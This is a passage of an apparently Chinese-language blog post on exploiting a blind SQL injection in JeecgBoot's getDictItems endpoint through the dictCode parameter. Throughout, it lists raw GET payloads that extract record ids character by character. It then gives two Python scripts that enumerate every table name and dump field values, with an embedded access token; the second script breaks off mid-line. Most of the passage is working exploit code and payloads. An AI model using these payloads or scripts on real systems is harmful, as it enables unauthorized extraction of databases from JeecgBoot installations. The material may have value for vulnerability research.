+<p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+id+from+aigc_word_template+where+length(id)%3D19) HTTP&#x2F;1.1</p>
+<p>进行验证</p>
+<p>获取id字段内容<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+1+from+aigc_word_template+where+cast(id+as+char)+like+’0%25’) HTTP&#x2F;1.1 </p>
+<p>从0开始</p>
+<p>返回真就是正确的，比如说id字段的内容为1957327567174488065</p>
+<p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+1+from+aigc_word_template+where+cast(id+as+char)+like+’1%25’) HTTP&#x2F;1.1</p>
+<p> 为真<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+1+from+aigc_word_template+where+cast(id+as+char)+like+’10%25’) HTTP&#x2F;1.1 </p>
+<p>假</p>
+<p>加了几轮<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+1+from+aigc_word_template+where+cast(id+as+char)+like+’19%25’) HTTP&#x2F;1.1 </p>
+<p>真</p>
+<p> 最后<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+1+from+aigc_word_template+where+cast(id+as+char)+like+’1957327567174488065%25’) HTTP&#x2F;1.1 </p>
+<p>真</p>
+<p>这里换到一个有两行以上的表。假设已知第一行id为1898995126819143682</p>
+<p> 确认存在下一行<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+1+from+airag_app+where+id+%3E+’1898995126819143682’) HTTP&#x2F;1.1 </p>
+<p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+1+from+airag_app+where+id+%3c+’1898995126819143682’) HTTP&#x2F;1.1</p>
+<p>大小都判断一下有一个为真就说明存在</p>
+<p> 确认下一行id的长度<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+1+from+airag_app+where+cast((select+min(id)+from+airag_app+where+id+%3E+’1898995126819143682’)+as+char)+like+’0%25’) HTTP&#x2F;1.1 </p>
+<p> 还是从0开始，一直到为真为止比如说1为真<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+1+from+airag_app+where+cast((select+min(id)+from+airag_app+where+id+%3E+’1898995126819143682’)+as+char)+like+’1%25’) HTTP&#x2F;1.1 </p>
+<p> 下一个就是<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+1+from+airag_app+where+cast((select+min(id)+from+airag_app+where+id+%3E+’1898995126819143682’)+as+char)+like+’10%25’) HTTP&#x2F;1.1 </p>
+<p>直到为真为止<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+1+from+airag_app+where+cast((select+min(id)+from+airag_app+where+id+%3E+’1898995126819143682’)+as+char)+like+’1899017221531811841%25’) HTTP&#x2F;1.1 </p>
+<p>其他字段也是同理，但每个字段都需要考虑字母、数字、符号，暂时不考虑中文。这也只是当前库的payload，如果还有弄其他库工作量实在太大了。手搓完payload叫ai写脚本干活就行了。</p>
+<p>爆所有表名脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"> </span><br><span class="line">URL = <span class="string">&quot;http://localhost:8080/jeecg-boot/sys/api/getDictItems&quot;</span>  </span><br><span class="line">HEADERS = &#123;  </span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;X-Access-Token&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNlc2hpIiwiY2xpZW50VHlwZSI6IlBDIiwiZXhwIjoxNzc0MTMwODY4fQ.zh5zmmCKLX41pI54TBKodIW_nohwwWZ7SR5BqZnKSaE&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">DELAY = <span class="number">0</span>  <span class="comment"># 取消请求间隔  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 创建会话，复用连接  </span></span><br><span class="line">session = requests.Session()  </span><br><span class="line">session.headers.update(HEADERS)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">condition</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    发送注入条件，返回True表示页面正常（返回非空数组），False表示异常（空数组或错误JSON）。  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    dict_code = <span class="string">f&quot;sys_user,username,id,1=1 and <span class="subst">&#123;condition&#125;</span>&quot;</span>  </span><br><span class="line">    full_url = <span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>?dictCode=<span class="subst">&#123;dict_code&#125;</span>&quot;</span>  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        resp = session.get(full_url, timeout=<span class="number">10</span>)  </span><br><span class="line">        <span class="keyword">if</span> resp.status_code != <span class="number">200</span>:  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">        text = resp.text.strip()  </span><br><span class="line">        <span class="comment"># 正常有数据的数组以 &#x27;[&#x27; 开头且长度大于2（即至少有一个元素）  </span></span><br><span class="line">        <span class="keyword">if</span> text.startswith(<span class="string">&#x27;[&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(text) &gt; <span class="number">2</span>:  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">    <span class="keyword">finally</span>:  </span><br><span class="line">        <span class="keyword">if</span> DELAY &gt; <span class="number">0</span>:  </span><br><span class="line">            time.sleep(DELAY)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_search_length</span>(<span class="params">cond_template, max_len=<span class="number">1000</span></span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    二分法获取长度，cond_template 应包含占位符 &#123;n&#125;，例如 &quot;length(...) &gt; &#123;n&#125;&quot;    &quot;&quot;&quot;</span>    low, high = <span class="number">1</span>, max_len  </span><br><span class="line">    <span class="comment"># 确定上界  </span></span><br><span class="line">    <span class="keyword">while</span> send_payload(cond_template.<span class="built_in">format</span>(n=high)):  </span><br><span class="line">        high *= <span class="number">2</span>  </span><br><span class="line">        <span class="keyword">if</span> high &gt; <span class="number">10000</span>:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="comment"># 二分查找  </span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:  </span><br><span class="line">        mid = (low + high) // <span class="number">2</span>  </span><br><span class="line">        <span class="keyword">if</span> send_payload(cond_template.<span class="built_in">format</span>(n=mid)):  </span><br><span class="line">            low = mid + <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            high = mid  </span><br><span class="line">    <span class="keyword">return</span> low  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_count</span>():  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;获取当前库下的表总数（去重）&quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 获取表总数...&quot;</span>)  </span><br><span class="line">    cond = <span class="string">&quot;((select count(distinct table_name) from mysql.innodb_index_stats where database_name=database()) &gt; &#123;n&#125;)&quot;</span>  </span><br><span class="line">    <span class="keyword">return</span> binary_search_length(cond, max_len=<span class="number">200</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>(<span class="params">where_cond=<span class="string">&quot;&quot;</span></span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    根据条件获取第一个表名。  </span></span><br><span class="line"><span class="string">    where_cond 可以是空（第一个表），或 &quot;table_name &gt; &#x27;prev_table&#x27;&quot;    返回表名字符串。  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    <span class="keyword">if</span> where_cond:  </span><br><span class="line">        base = <span class="string">f&quot;select min(table_name) from mysql.innodb_index_stats where database_name=database() and <span class="subst">&#123;where_cond&#125;</span>&quot;</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        base = <span class="string">&quot;select min(table_name) from mysql.innodb_index_stats where database_name=database()&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 获取表名长度  </span></span><br><span class="line">    len_cond = <span class="string">f&quot;length((<span class="subst">&#123;base&#125;</span>)) &gt; &#123;&#123;n&#125;&#125;&quot;</span>  </span><br><span class="line">    length = binary_search_length(len_cond)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 表名长度: <span class="subst">&#123;length&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):  </span><br><span class="line">        <span class="comment"># 在ASCII可打印字符32~126范围内二分查找  </span></span><br><span class="line">        low, high = <span class="number">32</span>, <span class="number">126</span>  </span><br><span class="line">        <span class="keyword">while</span> low &lt; high:  </span><br><span class="line">            mid = (low + high + <span class="number">1</span>) // <span class="number">2</span>  <span class="comment"># 向上取整，避免死循环  </span></span><br><span class="line">            test_prefix = table_name + <span class="built_in">chr</span>(mid)  </span><br><span class="line">            <span class="comment"># 判断最小表名是否小于 test_prefix            cond = f&quot;((&#123;base&#125;) &lt; &#x27;&#123;test_prefix&#125;&#x27;)&quot;  </span></span><br><span class="line">            <span class="keyword">if</span> send_payload(cond):  </span><br><span class="line">                <span class="comment"># 如果小于，说明实际表名 &lt; test_prefix，则当前字符 &lt; mid                high = mid - 1  </span></span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="comment"># 否则，实际表名 &gt;= test_prefix，则当前字符 &gt;= mid                low = mid  </span></span><br><span class="line">        <span class="comment"># 循环结束时 low 即为实际字符的ASCII码  </span></span><br><span class="line">        table_name += <span class="built_in">chr</span>(low)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;   当前表名: <span class="subst">&#123;table_name&#125;</span>&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> table_name  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_tables</span>():  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;获取所有表名&quot;&quot;&quot;</span>  </span><br><span class="line">    tables = []  </span><br><span class="line">    <span class="comment"># 第一个表  </span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 获取第一个表名...&quot;</span>)  </span><br><span class="line">    first = get_table_name()  </span><br><span class="line">    tables.append(first)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 第一个表名: <span class="subst">&#123;first&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 后续表  </span></span><br><span class="line">    idx = <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 获取第 <span class="subst">&#123;idx&#125;</span> 个表名...&quot;</span>)  </span><br><span class="line">        where = <span class="string">f&quot;table_name &gt; &#x27;<span class="subst">&#123;tables[-<span class="number">1</span>]&#125;</span>&#x27;&quot;</span>  </span><br><span class="line">        <span class="comment"># 先判断是否存在下一个表  </span></span><br><span class="line">        exists_cond = <span class="string">f&quot;((select count(distinct table_name) from mysql.innodb_index_stats where database_name=database() and table_name &gt; &#x27;<span class="subst">&#123;tables[-<span class="number">1</span>]&#125;</span>&#x27;) &gt; 0)&quot;</span>  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> send_payload(exists_cond):  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 没有更多表&quot;</span>)  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        next_table = get_table_name(where)  </span><br><span class="line">        tables.append(next_table)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 第 <span class="subst">&#123;idx&#125;</span> 个表名: <span class="subst">&#123;next_table&#125;</span>&quot;</span>)  </span><br><span class="line">        idx += <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">return</span> tables  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    table_count = get_table_count()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 当前库共有 <span class="subst">&#123;table_count&#125;</span> 张表&quot;</span>)  </span><br><span class="line">    tables = get_all_tables()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 所有表名: <span class="subst">&#123;tables&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260401212800209.png" alt="image-20260401212800209"></p>
+<p>列还是不好爆，而且太多了，数据量堆起来时间复杂度太大了。这里就用字典代替，列举一些常用字段，效率大大提升。</p>
+<p>爆内容脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> string  </span><br><span class="line">  </span><br><span class="line">URL = <span class="string">&quot;http://localhost:8080/jeecg-boot/sys/api/getDictItems&quot;</span>  </span><br><span class="line">HEADERS = &#123;  </span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;X-Access-Token&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNlc2hpIiwiY2xpZW50VHlwZSI6IlBDIiwiZXhwIjoxNzc0MTMwODY4fQ.zh5zmmCKLX41pI54TBKodIW_nohwwWZ7SR5BqZnKSaE&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">DELAY = <span class="number">0</span>  </span><br><span class="line">  </span><br><span class="line">ID_FIELD = <span class="string">&quot;id&quot;</span> <span class="comment"># 用于定位行的字段（通常为主键）  </span></span><br><span class="line">FIELDS = [  </span><br><span class="line">    <span class="string">&quot;id&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;name&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;create_time&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;update_time&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;create_by&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;update_by&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;status&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;code&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;width&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;height&quot;</span>  </span><br><span class="line">]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 字符集（按 ASCII 升序：数字、大写字母、下划线、小写字母）  </span></span><br><span class="line">CHARS_ASC = string.digits + string.ascii_uppercase + <span class="string">&#x27;_&#x27;</span> + string.ascii_lowercase  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 会话复用  </span></span><br><span class="line">session = requests.Session()  </span><br><span class="line">session.headers.update(HEADERS)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">condition</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    发送注入条件，返回 True 表示页面正常（返回非空数组），False 表示异常（空数组或错误）  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    dict_code = <span class="string">f&quot;sys_user,username,id,1=1 and <span class="subst">&#123;condition&#125;</span>&quot;</span>  </span><br><span class="line">    full_url = <span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>?dictCode=<span class="subst">&#123;dict_code&#125;</span>&quot;</span>  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        resp = session.get(full_url, timeout=<span class="number">10</span>)  </span><br><span class="line">        <span class="keyword">if</span> resp.status_code != <span class="number">200</span>:  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">        text = resp.text.strip()  </span><br><span class="line">        <span class="comment"># 正常有数据的数组以 &#x27;[&#x27; 开头且长度大于2（至少有一个元素）  </span></span><br><span class="line">        <span class="keyword">return</span> text.startswith(<span class="string">&#x27;[&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(text) &gt; <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">except</span> Exception:  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">    <span class="keyword">finally</span>:  </span><br><span class="line">        <span class="keyword">if</span> DELAY &gt; <span class="number">0</span>:  </span><br><span class="line">            time.sleep(DELAY)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">linear_search_length</span>(<span class="params">cond_template, start=<span class="number">0</span></span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    线性递增获取长度，cond_template 包含 &#123;n&#125;，从 start 开始递增直到条件为假  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    n = start  </span><br><span class="line">    <span class="keyword">while</span> send_payload(cond_template.<span class="built_in">format</span>(n=n)):  </span><br><span class="line">        n += <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">return</span> n  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_field_exists</span>(<span class="params">table, field</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;判断表中是否存在指定字段&quot;&quot;&quot;</span>  </span><br><span class="line">    cond = <span class="string">f&quot;(select count(<span class="subst">&#123;field&#125;</span>) from <span class="subst">&#123;table&#125;</span>) &gt;= 0&quot;</span>  </span><br><span class="line">    <span class="keyword">return</span> send_payload(cond)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_has_data</span>(<span class="params">table</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;判断表是否有数据（至少一行）&quot;&quot;&quot;</span>  </span><br><span class="line">    cond = <span class="string">f&quot;(select count(*) from <span class="subst">&#123;table&#125;</span>) &gt; 0&quot;</span>  </span><br><span class="line">    <span class="keyword">return</span> send_payload(cond)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value_length_by_subquery</span>(<span class="params">table, subquery</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    获取子查询返回值的长度（线性递增）  </span></span><br><span class="line"><span class="string">    subquery: 例如 &quot;select min(id) from aigc_word_template&quot;    &quot;&quot;&quot;</span>    cond = <span class="string">f&quot;exists(select 1 from <span class="subst">&#123;table&#125;</span> where length((<span class="subst">&#123;subquery&#125;</span>)) &gt; &#123;&#123;n&#125;&#125;)&quot;</span>  </span><br><span class="line">    <span class="keyword">return</span> linear_search_length(cond, start=<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value_by_subquery</span>(<span class="params">table, subquery, length</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    获取子查询返回值的具体内容（逐字符 like 探测）  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    value = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):  </span><br><span class="line">        found = <span class="literal">False</span>  </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> CHARS_ASC:  </span><br><span class="line">            <span class="comment"># 单引号转义（替换为两个单引号）  </span></span><br><span class="line">            safe_value = value.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>)  